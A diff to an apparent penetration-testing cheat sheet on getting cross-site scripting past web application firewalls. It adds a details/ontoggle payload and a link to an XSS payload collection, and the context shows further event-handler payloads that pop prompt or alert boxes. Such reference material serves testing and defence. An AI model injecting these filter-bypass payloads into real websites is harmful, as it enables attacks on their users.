@@ -25,12 +25,16 @@ WAF got you down? There are a ton of bypasses, look at HTML5 for more ideas also
 ```html
 <body onpageshow="prompt(123)">
 <details open ontoggle="prompt('xss via toggle')">Toggle Me For More prompts</details>
+<details/open/ontoggle="alert`1`">
 <video onmouseenter=prompt(123)>
 <video onwheel=prompt(123)>
 <math><maction actiontype="statusline" 
 xlink:href="http://www.aswsec.com/pen-test/x.svg">CLICKME<mtext></mtext></maction>
 ```
 Here you will find a great resource: https://html5sec.org/
+
+Here you will find more ideas:
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection
 
 Don't forget the injection might not be a form tag but in the javascript.
 ==============
@@ -90,7 +94,7 @@ Internet Explorer can be your friend
 ==============
 A lot of times you will notice that " or ' has become %22 or %27 in Chrome, Firefox, Opera etc. But did you try Internet Explorer. Many times you can get an Internet Explorer only XSS due to how the browser works.
 
-Interesting HTML Concepts
+Interesting XSS
 ==============
 ```html
 <xxxxxx onmouseover=confirm(/Mouse&nbsp;Test&nbsp;It/.source)>Example 123
